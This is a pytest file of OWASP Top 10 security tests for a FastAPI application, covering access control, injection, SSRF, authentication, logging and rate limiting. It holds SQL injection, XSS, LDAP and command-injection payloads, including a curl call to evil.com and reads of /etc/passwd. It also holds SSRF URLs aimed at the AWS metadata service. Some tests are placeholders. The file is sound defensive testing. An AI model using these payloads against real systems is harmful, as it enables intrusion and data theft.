#!/usr/bin/env python3
"""
Comprehensive OWASP Security Tests

Tests for preventing:
- A01: Broken Access Control (IDOR, privilege escalation)
- A03: Injection (SQLi, XSS, command injection)
- A05: Security Misconfiguration
- A07: Authentication Failures
- A09: Security Logging Failures
- A10: Server-Side Request Forgery (SSRF)

Author: Security Team
Version: 1.0
Date: 2025-12-27
"""

import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

# Import the app for testing
# Note: Some endpoints have syntax errors (OWASP findings) and are not imported
from app.main import app

# Mark all tests as security tests
pytestmark = pytest.mark.security


class TestA01_BrokenAccessControl:
    """
    A01:2021 - Broken Access Control Tests

    Tests for IDOR, privilege escalation, and unauthorized access
    """

    @pytest.mark.asyncio
    async def test_idor_user_enumeration(self, client: AsyncClient, auth_headers_user):
        """
        IDOR Test: User should not be able to enumerate other users by ID
        """
        response = await client.get(
            "/api/v1/users/99999", headers=auth_headers_user  # Non-existent user ID
        )

        # Should return 404, not 403 (to prevent enumeration)
        assert response.status_code in [404, 403]

    @pytest.mark.asyncio
    async def test_idor_assessment_access(
        self, client: AsyncClient, auth_headers_user, test_assessment_id
    ):
        """
        IDOR Test: User should not access other users' assessments
        """
        response = await client.get(
            f"/api/v1/assessments/{test_assessment_id}", headers=auth_headers_user
        )

        # If assessment exists and user doesn't own it, should be 403
        if response.status_code == 200:
            # If we get data, verify it belongs to the user
            data = response.json()
            assert data.get("created_by_id") == int(auth_headers_user["user_id"])

    @pytest.mark.asyncio
    async def test_privilege_escalation_role_manipulation(
        self, client: AsyncClient, auth_headers_user
    ):
        """
        Test: Users cannot escalate privileges by manipulating role field
        """
        update_data = {
            "role": "admin",  # Try to escalate to admin
            "full_name": "Test User",
        }

        response = await client.put(
            "/api/v1/users/me", json=update_data, headers=auth_headers_user
        )

        # Should reject role update
        assert response.status_code in [400, 403, 422]

        # Verify role wasn't changed
        response = await client.get("/api/v1/users/me", headers=auth_headers_user)
        assert response.json()["role"] != "admin"

    @pytest.mark.asyncio
    async def test_bypass_authorization_with_missing_dependency(
        self, client: AsyncClient
    ):
        """
        Test: Cannot access protected endpoints without auth
        """
        endpoints = [
            "/api/v1/users/me",
            "/api/v1/users/",
            "/api/v1/assessments/",
            "/api/v1/ai/secure/chat",
        ]

        for endpoint in endpoints:
            response = await client.get(endpoint)
            assert (
                response.status_code == 401
            ), f"Endpoint {endpoint} should require auth"

    @pytest.mark.asyncio
    async def test_horizontal_access_control_users(
        self, client: AsyncClient, auth_headers_admin
    ):
        """
        Test: Admin cannot perform actions on other users without proper authorization
        """
        # This tests that even admins have proper access controls
        response = await client.get(
            "/api/v1/users/?created_by=1",  # Try to filter by another user
            headers=auth_headers_admin,
        )

        # Should only return users the admin has access to
        assert response.status_code == 200


class TestA03_Injection:
    """
    A03:2021 - Injection Tests

    Tests for SQLi, XSS, command injection, and LDAP injection
    """

    @pytest.mark.asyncio
    async def test_sql_injection_login(self, client: AsyncClient):
        """
        SQLi Test: Attempt SQL injection in login form
        """
        sqli_payloads = [
            "admin' --",
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "' OR '1'='1' --",
            "1' UNION SELECT * FROM users--",
        ]

        for payload in sqli_payloads:
            response = await client.post(
                "/api/v1/auth/token", data={"username": payload, "password": "test"}
            )

            # Should return 401, not 500
            assert response.status_code == 401
            # Should not leak database errors
            assert "error" not in response.text.lower()
            assert "sql" not in response.text.lower()
            assert "syntax" not in response.text.lower()

    @pytest.mark.asyncio
    async def test_xss_in_user_input(self, client: AsyncClient, auth_headers_user):
        """
        XSS Test: User input should be sanitized
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
        ]

        for payload in xss_payloads:
            # Test in profile update
            response = await client.put(
                "/api/v1/users/me",
                json={"full_name": payload},
                headers=auth_headers_user,
            )

            if response.status_code == 200:
                # If successful, verify XSS is sanitized
                data = response.json()
                full_name = data.get("full_name", "")
                # Should not contain raw script tags
                assert "<script>" not in full_name
                assert "javascript:" not in full_name.lower()

    @pytest.mark.asyncio
    async def test_sql_injection_search(self, client: AsyncClient, auth_headers_admin):
        """
        SQLi Test: Attempt SQL injection in search parameters
        """
        sqli_payloads = [
            "test' OR '1'='1",
            "test' UNION SELECT * FROM users--",
            "test'; DROP TABLE assessments; --",
        ]

        for payload in sqli_payloads:
            response = await client.get(
                f"/api/v1/users/?search={payload}", headers=auth_headers_admin
            )

            # Should return 400 (validation) or 200 (empty results), not 500
            assert response.status_code in [200, 400]
            assert "sql" not in response.text.lower()

    @pytest.mark.asyncio
    async def test_command_injection(self, client: AsyncClient, auth_headers_user):
        """
        Command Injection Test: Attempt command injection in file uploads
        """
        command_payloads = [
            "test.txt; cat /etc/passwd",
            "test.txt | whoami",
            "test.txt && curl http://evil.com/steal",
            "test.txt`id`",
        ]

        for payload in command_payloads:
            # This would typically be in file upload endpoints
            # For now, test in search functionality
            response = await client.get(
                f"/api/v1/assessments/?search={payload}", headers=auth_headers_user
            )

            # Should handle safely
            assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio
    async def test_ldap_injection(self, client: AsyncClient):
        """
        LDAP Injection Test: Attempt LDAP injection (if LDAP is used)
        """
        ldap_payloads = ["*)(uid=*", "*))(|(uid=*", "*)(password=*", "admin*"]

        for payload in ldap_payloads:
            response = await client.post(
                "/api/v1/auth/token", data={"username": payload, "password": "test"}
            )

            # Should handle safely
            assert response.status_code == 401


class TestA05_SecurityMisconfiguration:
    """
    A05:2021 - Security Misconfiguration Tests

    Tests for secure defaults, proper error handling, and feature flags
    """

    @pytest.mark.asyncio
    async def test_no_stack_traces_in_errors(self, client: AsyncClient):
        """
        Test: Error responses should not contain stack traces
        """
        # Trigger various errors
        endpoints = [
            ("/api/v1/users/999999", "GET"),  # Non-existent user
            ("/api/v1/assessments/invalid", "GET"),  # Invalid ID type
            ("/api/v1/auth/token", "POST"),  # Missing credentials
        ]

        for endpoint, method in endpoints:
            if method == "GET":
                response = await client.get(endpoint)
            else:
                response = await client.post(endpoint, json={})

            # Should not contain stack traces
            assert "Traceback" not in response.text
            assert 'File "/usr/local/lib' not in response.text
            assert "Exception" not in response.text

    @pytest.mark.asyncio
    async def test_secure_headers(self, client: AsyncClient):
        """
        Test: Response should include security headers
        """
        response = await client.get("/api/v1/health")

        # Check for security headers
        headers = response.headers

        # These headers should be present (may vary by deployment)
        # assert "X-Content-Type-Options" in headers
        # assert "X-Frame-Options" in headers or "frame-ancestors" in headers.get("Content-Security-Policy", "")

    @pytest.mark.asyncio
    async def test_no_debug_information(self, client: AsyncClient):
        """
        Test: Debug information should not be leaked
        """
        # Make requests that might trigger errors
        response = await client.get("/api/v1/users/nonexistent")

        # Should not contain debug info
        assert "DEBUG" not in response.text
        assert "settings" not in response.text.lower()
        assert "environment" not in response.text.lower()

    @pytest.mark.asyncio
    async def test_default_deny_access_control(self, client: AsyncClient):
        """
        Test: New endpoints should be secure by default
        Test: Access should be denied by default, not allowed
        """
        # Try to access endpoints without proper auth
        response = await client.get("/api/v1/admin/settings")

        # Should be denied
        assert response.status_code == 401


class TestA07_AuthenticationFailures:
    """
    A07:2021 - Identification and Authentication Failures Tests

    Tests for password security, session management, and authentication bypass
    """

    @pytest.mark.asyncio
    async def test_weak_password_rejected(self, client: AsyncClient):
        """
        Test: Weak passwords should be rejected
        """
        weak_passwords = ["password", "123456", "qwerty", "abc123", "test"]

        for password in weak_passwords:
            response = await client.post(
                "/api/v1/auth/register",
                json={
                    "email": f"test{password}@example.com",
                    "password": password,
                    "full_name": "Test User",
                },
            )

            # Should reject weak password
            assert response.status_code == 400
            assert (
                "password" in response.text.lower()
                or "strength" in response.text.lower()
            )

    @pytest.mark.asyncio
    async def test_password_not_logged(self, client: AsyncClient, monkeypatch):
        """
        Test: Passwords should never be logged
        """
        # This test would require capturing logs
        # For now, just verify passwords aren't in responses
        response = await client.post(
            "/api/v1/auth/token",
            data={"username": "test", "password": "MySecretPassword123!"},
        )

        # Password should not be in response
        assert "MySecretPassword123!" not in response.text

    @pytest.mark.asyncio
    async def test_session_timeout(self, client: AsyncClient, auth_headers_user):
        """
        Test: Sessions should timeout appropriately
        """
        # Make a request
        response = await client.get("/api/v1/users/me", headers=auth_headers_user)

        # Token should have expiration info
        # This would need to check JWT claims
        assert response.status_code == 200

    @pytest.mark.asyncio
    async def test_concurrent_login_limit(self, client: AsyncClient):
        """
        Test: Should limit concurrent sessions
        """
        # This would require multiple login attempts
        # For now, just document the requirement
        pass


class TestA09_SecurityLogging:
    """
    A09:2021 - Security Logging and Monitoring Failures Tests

    Tests for audit logging, event monitoring, and alerting
    """

    @pytest.mark.asyncio
    async def test_login_events_logged(self, client: AsyncClient, caplog):
        """
        Test: Login attempts should be logged
        """
        import logging

        with caplog.at_level(logging.INFO):
            response = await client.post(
                "/api/v1/auth/token",
                data={"username": "test@example.com", "password": "wrongpassword"},
            )

        # Should have logged the failed attempt
        assert any("login" in record.message.lower() for record in caplog.records)

    @pytest.mark.asyncio
    async def test_unauthorized_access_logged(self, client: AsyncClient, caplog):
        """
        Test: Unauthorized access attempts should be logged
        """
        import logging

        with caplog.at_level(logging.WARNING):
            response = await client.get("/api/v1/users/")

        # Should have logged unauthorized access
        assert any(
            "unauthorized" in record.message.lower()
            or "forbidden" in record.message.lower()
            for record in caplog.records
        )

    @pytest.mark.asyncio
    async def test_sensitive_actions_logged(
        self, client: AsyncClient, auth_headers_user, caplog
    ):
        """
        Test: Sensitive actions (password change, deletion) should be logged
        """
        import logging

        with caplog.at_level(logging.INFO):
            response = await client.post(
                "/api/v1/users/change-password",
                json={"current_password": "oldpass", "new_password": "NewPass123!"},
                headers=auth_headers_user,
            )

        # Should log password change attempt (success or failure)
        assert any("password" in record.message.lower() for record in caplog.records)


class TestA10_SSRF:
    """
    A10:2021 - Server-Side Request Forgery Tests

    Tests for SSRF vulnerabilities in URL handling
    """

    @pytest.mark.asyncio
    async def test_ssrf_via_internal_url(self, client: AsyncClient, auth_headers_user):
        """
        Test: Cannot access internal URLs via SSRF
        """
        internal_urls = [
            "http://localhost:8080/admin",
            "http://127.0.0.1:6379",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://[::1]/admin",
            "file:///etc/passwd",
        ]

        for url in internal_urls:
            # This would typically be in webhook/callback endpoints
            # For now, test that URLs are validated
            response = await client.post(
                "/api/v1/assessments/1/assignments",
                json={"callback_url": url, "user_id": 1},
                headers=auth_headers_user,
            )

            # Should reject internal URLs
            assert response.status_code in [400, 403, 422]

    @pytest.mark.asyncio
    async def test_ssrf_via_dns_rebinding(self, client: AsyncClient, auth_headers_user):
        """
        Test: DNS rebinding attacks should be prevented
        """
        suspicious_urls = [
            "http://evil.com@127.0.0.1",
            "http://evil.com@localhost",
            "http://0177.0.0.1",  # Octal IP
            "http://2130706433",  # Decimal IP for 127.0.0.1
        ]

        for url in suspicious_urls:
            response = await client.post(
                "/api/v1/webhooks/register",
                json={"url": url},
                headers=auth_headers_user,
            )

            # Should reject suspicious URLs
            assert response.status_code in [400, 403, 422]


class TestAdditionalSecurity:
    """
    Additional security tests beyond OWASP Top 10
    """

    @pytest.mark.asyncio
    async def test_rate_limiting_enforced(self, client: AsyncClient):
        """
        Test: Rate limiting should prevent abuse
        """
        # Make multiple rapid requests
        responses = []
        for _ in range(10):
            response = await client.post(
                "/api/v1/auth/token", data={"username": "test", "password": "wrong"}
            )
            responses.append(response)

        # Should eventually hit rate limit
        status_codes = [r.status_code for r in responses]
        assert 429 in status_codes  # Too Many Requests

    @pytest.mark.asyncio
    async def test_csrf_protection(self, client: AsyncClient):
        """
        Test: CSRF protection should be in place
        """
        # Try state-changing operation without CSRF token
        response = await client.post("/api/v1/users/me", json={"full_name": "Hacked"})

        # Should require auth (which includes CSRF protection)
        assert response.status_code == 401

    @pytest.mark.asyncio
    async def test_http_methods_restricted(self, client: AsyncClient):
        """
        Test: HTTP methods should be restricted
        """
        # Try unsupported methods
        response = await client.put("/api/v1/users/")
        assert response.status_code == 405  # Method Not Allowed

    @pytest.mark.asyncio
    async def test_mass_assignment_prevented(
        self, client: AsyncClient, auth_headers_user
    ):
        """
        Test: Mass assignment vulnerabilities should be prevented
        """
        # Try to update fields that shouldn't be user-modifiable
        response = await client.put(
            "/api/v1/users/me",
            json={
                "id": 999,  # Try to change ID
                "role": "admin",  # Try to escalate
                "is_verified": True,  # Try to bypass verification
                "password_hash": "hacked",  # Try to set hash directly
            },
            headers=auth_headers_user,
        )

        # Should reject or sanitize
        if response.status_code == 200:
            data = response.json()
            assert data.get("id") != 999
            assert data.get("role") != "admin"


# ==================== Fixtures ====================


@pytest.fixture
async def client(app: FastAPI):
    """Async test client"""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        yield ac


@pytest.fixture
async def auth_headers_user(client: AsyncClient):
    """Get auth headers for regular user"""
    response = await client.post(
        "/api/v1/auth/token",
        data={"username": "user@example.com", "password": "UserPass123!"},
    )

    if response.status_code == 200:
        token = response.json().get("access_token")
        return {"Authorization": f"Bearer {token}", "user_id": "1"}

    return {"Authorization": "Bearer invalid_token", "user_id": "1"}


@pytest.fixture
async def auth_headers_admin(client: AsyncClient):
    """Get auth headers for admin user"""
    response = await client.post(
        "/api/v1/auth/token",
        data={"username": "admin@example.com", "password": "AdminPass123!"},
    )

    if response.status_code == 200:
        token = response.json().get("access_token")
        return {"Authorization": f"Bearer {token}", "user_id": "1"}

    return {"Authorization": "Bearer invalid_token", "user_id": "1"}


@pytest.fixture
def test_assessment_id():
    """Return a test assessment ID"""
    return 1


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
